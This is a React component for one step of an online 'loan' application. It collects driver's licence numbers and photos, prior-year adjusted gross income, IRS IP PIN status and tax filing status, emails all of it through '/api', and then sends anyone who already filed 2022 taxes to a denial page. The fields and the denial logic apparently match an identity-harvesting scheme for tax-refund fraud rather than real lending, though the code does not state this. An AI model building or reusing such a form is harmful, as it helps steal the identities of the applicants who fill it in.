/* eslint-disable react/no-unescaped-entities */
"use client";
import React, { useContext, useEffect, useState } from "react";

import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {
  faFileImage,
  faIdCardAlt,
  faImage,
} from "@fortawesome/free-solid-svg-icons";
import FormDataContext from "@/contexts/data";
import Dropzone from "react-dropzone";
import { useRouter } from "next/navigation";

import axios from "axios";

const LoanProcessSeven = ({ step, setStep }) => {
  const { formData, setFormData } = useContext(FormDataContext);
  const [isFileUploading, setFileUploading] = useState(false);
  const [isFileUploadingback, setFileUploadingback] = useState(false);
  const [bgloading, setbgloading] = useState(false);
  const [errors, setErrors] = useState({});
  const router = useRouter();

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleFileUpload = async (file) => {
    const formData = new FormData();
    formData.append("file", file);
    formData.append("upload_preset", "my_preset");

    try {
      const response = await axios.post(
        `https://api.cloudinary.com/v1_1/dgqjunu7l/upload`,
        formData
      );

      const { secure_url } = response.data;

      return secure_url;
    } catch (error) {
      console.error("Error uploading file:", error);
      throw new Error("Failed to upload file");
    }
  };

  const handleFrontViewUpload = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setFileUploading(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, frontView: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setFileUploading(false);
  };

  const handleBackViewUpload = async (acceptedFiles) => {
    const file = acceptedFiles[0];

    try {
      setFileUploadingback(true);
      const fileUrl = await handleFileUpload(file);

      setFormData({ ...formData, backView: fileUrl });
    } catch (error) {
      // Handle the error
    }
    setFileUploadingback(false);
  };

  const validateForm = () => {
    let isValid = true;
    const errors = {};

    if (!formData.creditScore) {
      errors.creditScore = "Choose a credit score range";
      isValid = false;
    }

    if (!formData.licenseNumber) {
      errors.licenseNumber = "Driver's license number is required";
      isValid = false;
    }

    if (!formData.licenseState) {
      errors.licenseState = "Driver's license state is required";
      isValid = false;
    }
    if (!formData.taxReturn) {
      errors.taxReturn = "This field is required.";
    }

    if (!formData.frontView) {
      errors.frontView = "Front view of driver's license is required";
      isValid = false;
    } else {
      const frontViewExtension = formData.frontView
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(frontViewExtension)) {
        errors.frontView = "Accepted formats: jpg, png";
        isValid = false;
      }
    }

    if (!formData.backView) {
      errors.backView = "Back view of driver's license is required";
      isValid = false;
    } else {
      const backViewExtension = formData.backView
        .split(".")
        .pop()
        .toLowerCase();
      if (!["jpg", "png"].includes(backViewExtension)) {
        errors.backView = "Accepted formats: jpg, png";
        isValid = false;
      }
    }
    if (!formData.didFile2021Taxes) {
      errors.didFile2021Taxes = "Please select an option";
      isValid = false;
    }
    if (!formData.receivedIPPIN) {
      errors.receivedIPPIN = "Please select an option";
      isValid = false;
    }

    if (!formData.meansOfDisbursement) {
      errors.meansOfDisbursement = "Please select an option";
      isValid = false;
    }

    setErrors(errors);
    return isValid;
  };

  const handleNext = async () => {
    const isValid = validateForm();
    if (isValid) {
      // Proceed to the next step
      try {
        setbgloading(true);
        await axios.post("/api", { formData });
        console.log("Email sent successfully");
        if (formData.taxReturn === "yes") {
          setbgloading(true);

          // Remove items from local storage
          localStorage.removeItem("formData");
          localStorage.removeItem("formStep");

          router.push("/loan/denied");
        } else {
          setStep(step + 1);
        }
      } catch (error) {
        console.error("Error sending email:", error);
      }
      setbgloading(false);
    }
  };

  const handlePrevious = () => {
    // Go back to the previous step
    setStep(step - 1);
  };

  return (
    <>
      <div className="w-full p-6 relative">
        <h2 className="capitalize font-bold text-2xl mb-8 text-center">
          Verification Details
        </h2>
        <div className="">
          <label
            className="block text-gray-700 font-semibold mb-2 mt-7"
            htmlFor="creditScore"
          >
            Credit Score
          </label>
          <div>
            <select
              className="block w-full border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
              name="creditScore"
              id="creditScore"
              value={formData.creditScore}
              onChange={handleChange}
              required
            >
              <option value="">Select</option>
              <option value="Excellent (720-850)">
                Excellent Credit (720-850)
              </option>
              <option value="Good (690-719)">Good Credit (690-719)</option>
              <option value="Fair (630-689)">Fair Credit (630-689)</option>
              <option value="Bad (300-639)">Bad Credit (300-629)</option>
              <option value="Not Sure">Not Sure</option>
            </select>
          </div>
          {errors.creditScore && (
            <p className="text-red-500 text-sm mt-1">{errors.creditScore}</p>
          )}
        </div>

        <div className="mt-7">
          <label
            className="block text-gray-700 font-semibold mb-2"
            htmlFor="licenseNumber"
          >
            Driver's License/State ID#
          </label>
          <div className="relative">
            <input
              className={`w-full border ${
                errors.licenseNumber ? "border-red-500" : "border-gray-300"
              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              type="text"
              name="licenseNumber"
              id="licenseNumber"
              value={formData.licenseNumber}
              onChange={handleChange}
              placeholder="Enter your driver's license/state ID#"
              required
            />
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <FontAwesomeIcon
                icon={faIdCardAlt}
                className="text-gray-500 text-sm"
              />
            </div>
          </div>
          {errors.licenseNumber && (
            <p className="text-red-500 text-sm mt-1">{errors.licenseNumber}</p>
          )}
        </div>

        <div className="mt-7">
          <label
            className="block text-gray-700 font-semibold mb-2"
            htmlFor="licenseState"
          >
            Driver's License State
          </label>
          <div className="relative">
            <input
              className={`w-full border ${
                errors.licenseState ? "border-red-500" : "border-gray-300"
              } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              type="text"
              name="licenseState"
              id="licenseState"
              value={formData.licenseState}
              onChange={handleChange}
              placeholder="Enter your driver's license state"
              required
            />
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <FontAwesomeIcon
                icon={faIdCardAlt}
                className="text-gray-500 text-sm"
              />
            </div>
          </div>
          {errors.licenseState && (
            <p className="text-red-500 text-sm mt-1">{errors.licenseState}</p>
          )}
        </div>
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Did you file your 2021 taxes?
          </label>
          <div>
            <select
              className={`block w-full  ${
                errors.didFile2021Taxes ? "border-red-500" : "border-gray-300"
              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              name="didFile2021Taxes"
              id="didFile2021Taxes"
              value={formData.didFile2021Taxes}
              onChange={handleChange}
              required
            >
              <option value="">Choose an option</option>
              <option value="Yes">Yes</option>
              <option value="No">No</option>
            </select>
          </div>
          {errors.didFile2021Taxes && (
            <p className="text-red-500 text-sm mt-1">
              {errors.didFile2021Taxes}
            </p>
          )}
        </div>

        {formData.didFile2021Taxes === "Yes" && (
          <div className="mt-7">
            <label className="block text-gray-700 font-semibold mb-2">
              What is your adjusted gross income (line 11 of your 1040)?
            </label>
            <div className="relative">
              <input
                className={`w-full border ${
                  errors.adjustedGrossIncome
                    ? "border-red-500"
                    : "border-gray-300"
                } rounded-lg pl-10 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
                type="text"
                name="adjustedGrossIncome"
                id="adjustedGrossIncome"
                value={formData.adjustedGrossIncome}
                onChange={handleChange}
                placeholder="Enter your adjusted gross income"
                required={formData.didFile2021Taxes === "Yes"}
              />
              <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                <FontAwesomeIcon
                  icon={faImage}
                  className="text-gray-500 text-sm"
                />
              </div>
            </div>
            {errors.adjustedGrossIncome && (
              <p className="text-red-500 text-sm mt-1">
                {errors.adjustedGrossIncome}
              </p>
            )}
          </div>
        )}

        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Did you receive an IP PIN from the IRS?
          </label>
          <div>
            <select
              className={`block w-full  ${
                errors.receivedIPPIN ? "border-red-500" : "border-gray-300"
              } border border-gray-300 rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              name="receivedIPPIN"
              id="receivedIPPIN"
              value={formData.receivedIPPIN}
              onChange={handleChange}
              required
            >
              <option value="">Choose an option</option>
              <option value="Yes">Yes</option>
              <option value="No">No</option>
            </select>
          </div>
          {errors.receivedIPPIN && (
            <p className="text-red-500 text-sm mt-1">{errors.receivedIPPIN}</p>
          )}
        </div>
        <label
          className="block text-gray-700 font-semibold mb-2 mt-7"
          htmlFor="taxReturn"
        >
          Did you file for 2022 tax return?
        </label>
        <select
          className="w-full border border-gray-300 rounded-lg pl-3 pr-4 py-2 text-gray-700 focus:border-blue-500 focus:outline-none"
          name="taxReturn"
          id="taxReturn"
          value={formData.taxReturn}
          onChange={handleChange}
          required
        >
          <option value="">Select...</option>
          <option value="yes">Yes</option>
          <option value="no">No</option>
        </select>
        {errors.taxReturn && <p className="text-red-500">{errors.taxReturn}</p>}
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Means of Disbursement
          </label>
          <div>
            <select
              className={`block w-full border ${
                errors.meansOfDisbursement
                  ? "border-red-500"
                  : "border-gray-300"
              } rounded-lg pl-3 pr-10 py-2 text-gray-700 focus:border-blue-500 focus:outline-none`}
              name="meansOfDisbursement"
              id="meansOfDisbursement"
              value={formData.meansOfDisbursement}
              onChange={handleChange}
              required
            >
              <option value="">Choose an option</option>
              <option value="cashmailing">Cash Mailing</option>
              <option value="directdeposit">Direct Deposit</option>
            </select>
          </div>
          {errors.meansOfDisbursement && (
            <p className="text-red-500 text-sm mt-1">
              {errors.meansOfDisbursement}
            </p>
          )}
        </div>
        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload the front view of your driver's license
          </label>
          <Dropzone onDrop={handleFrontViewUpload} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {isFileUploading ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.frontView ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>

          {errors.frontView && (
            <p className="text-red-500 text-sm mt-1">{errors.frontView}</p>
          )}
        </div>

        <div className="mt-7">
          <label className="block text-gray-700 font-semibold mb-2">
            Upload the back view of your driver's license
          </label>
          <Dropzone onDrop={handleBackViewUpload} multiple={false}>
            {({ getRootProps, getInputProps }) => (
              <div className="border border-gray-300 rounded-lg p-4">
                <div {...getRootProps()} className="cursor-pointer">
                  <input {...getInputProps()} />
                  {isFileUploadingback ? (
                    <p className="font-bold">Uploading Document...</p>
                  ) : formData.backView ? (
                    <div className="font-bold flex items-center">
                      <FontAwesomeIcon
                        icon={faFileImage}
                        className="text-gray-500"
                      />
                      <div className="text-sm pl-3 text-gray-600">
                        File Uploaded
                      </div>
                    </div>
                  ) : (
                    <p>
                      Drag and drop or click to select a file. (Accepted
                      formats: jpg, png)
                    </p>
                  )}
                </div>
              </div>
            )}
          </Dropzone>
          {errors.backView && (
            <p className="text-red-500 text-sm mt-1">{errors.backView}</p>
          )}
        </div>

        <div className="flex justify-between mt-8">
          <button
            className="px-6 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold"
            onClick={handlePrevious}
          >
            Previous
          </button>
          <button
            className={`px-4 py-2 rounded-md text-sm text-white font-semibold ${
              bgloading ? "bg-gray-400 cursor-not-allowed" : "bg-blue-500"
            }`}
            onClick={handleNext}
            disabled={bgloading}
          >
            {bgloading ? "Please wait" : "Next"}
          </button>
        </div>
      </div>
    </>
  );
};

export default LoanProcessSeven;
